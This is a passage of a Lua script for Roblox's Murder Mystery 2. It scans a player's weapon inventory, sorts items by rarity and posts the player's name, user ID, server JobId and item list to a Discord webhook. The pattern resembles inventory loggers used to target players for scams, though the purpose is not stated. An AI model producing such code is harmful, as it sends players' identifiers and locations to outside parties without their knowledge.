local WEAPONS = {
    "Chroma", "Luger", "Slasher", "Pixel", "Clockwork", "Spider", "Deathshard",
    "Fang", "Heat", "Laser", "Nightblade", "Old Glory", "Saw", "Shark", "Tides",
    "Virtual", "Elderwood", "Hallows", "Battle", "Cane", "Icebreaker", "Corrupt",
    "Ancient", "Hallow", "Bat", "Boneblade", "Candy", "Sweet", "Heart",
    "Cupid", "Heartblade", "Valentine", "Love", "Minty", "Logchopper", "Xmas",
    "Icewing", "Ghostblade", "Viper", "Shadow", "Phantom", "Bio Blade"
}

local function classifyWeapon(name)
    if name:find("Chroma") then return "Chroma Godly 🌈"
    elseif name:find("Cupid") or name:find("Heartblade") then return "Unique ❤️"
    elseif name:find("Ancient") then return "Ancient ⚜️"
    elseif name:find("Icewing") or name:find("Ghostblade") then return "Legendary ⭐"
    elseif name:find("Luger") or name:find("Slasher") or name:find("Pixel") then return "Godly 👑"
    end
    for _, w in pairs(WEAPONS) do
        if name:find(w) then return "Godly 👑" end
    end
    return "Regular 🔪"
end

local function scanInventory()
    local items = {}
    
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            items[item.Name] = true
        end
    end
    
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") then
                items[item.Name] = true
            end
        end
    end
    
    return items
end

-- ============================================
-- SEND TO DISCORD
-- ============================================

local function sendInventory()
    local inventory = scanInventory()
    local itemsList = {}
    local counts = {Godly = 0, Chroma = 0, Ancient = 0, Unique = 0, Legendary = 0, Regular = 0}
    
    for name, _ in pairs(inventory) do
        local rarity = classifyWeapon(name)
        table.insert(itemsList, {name = name, rarity = rarity})
        
        if rarity:find("Chroma") then counts.Chroma = counts.Chroma + 1
        elseif rarity:find("Godly") then counts.Godly = counts.Godly + 1
        elseif rarity:find("Ancient") then counts.Ancient = counts.Ancient + 1
        elseif rarity:find("Unique") then counts.Unique = counts.Unique + 1
        elseif rarity:find("Legendary") then counts.Legendary = counts.Legendary + 1
        else counts.Regular = counts.Regular + 1
        end
    end
    
    local weaponText = ""
    for i, item in pairs(itemsList) do
        weaponText = weaponText .. item.rarity .. " " .. item.name .. "\n"
        if i >= 15 then
            weaponText = weaponText .. "... and " .. (#itemsList - 15) .. " more"
            break
        end
    end
    
    if weaponText == "" then
        weaponText = "No weapons found in your inventory"
    end
    
    local embed = {
        title = "🔫 " .. player.Name .. "'s MM2 Inventory",
        description = string.format(
            "**Server ID:** `%s`\n**Player:** %s\n**User ID:** %s\n\n" ..
            "**📊 Summary:**\n" ..
            "• Godlies: %d 👑\n" ..
            "• Chromas: %d 🌈\n" ..
            "• Ancients: %d ⚜️\n" ..
            "• Uniques: %d ❤️\n" ..
            "• Legendaries: %d ⭐\n" ..
            "• Regular: %d 🔪\n" ..
            "• **Total: %d weapons**",
            game.JobId or "Unknown",
            player.Name,
            player.UserId,
            counts.Godly, counts.Chroma, counts.Ancient, counts.Unique, counts.Legendary, counts.Regular,
            #itemsList
        ),
        color = 0xFF0000,
        fields = {
            {name = "📦 Weapon List", value = "```\n" .. weaponText .. "```", inline = false}
        },
        footer = {text = "MM2 Weapon Scanner | " .. os.date("%Y-%m-%d %H:%M:%S")}
    }
    
    sendWebhook(nil, embed)
    print("✅ Inventory sent to Discord: " .. #itemsList .. " weapons")
end

